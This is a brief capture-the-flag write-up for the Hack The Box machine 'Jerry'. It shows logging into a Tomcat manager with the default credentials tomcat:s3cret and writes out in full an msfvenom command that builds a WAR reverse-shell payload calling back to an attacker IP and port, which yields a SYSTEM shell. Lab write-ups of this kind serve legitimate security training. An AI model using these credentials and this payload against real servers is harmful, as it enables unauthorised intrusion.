# Jerry

URL: https://app.hackthebox.com/machines/Jerry

Level: Easy

Date 2 Jun 2020

## Walkthrough

- [Enumeration](#enumeration)

# Enumeration

## NMAP

We found port 8080/TCP, Tomcat.

We search on Google for default password:

https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

and we get access with `tomcat:s3cret`.

We use `msfvenom` to generate a war payload:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.36 LPORT=4444 -f war > shella.war
```

We upload .war file on Tomcat, and we start listening on port 4444/TCP.

We get an easy win with a SYSTEM reverse shell.
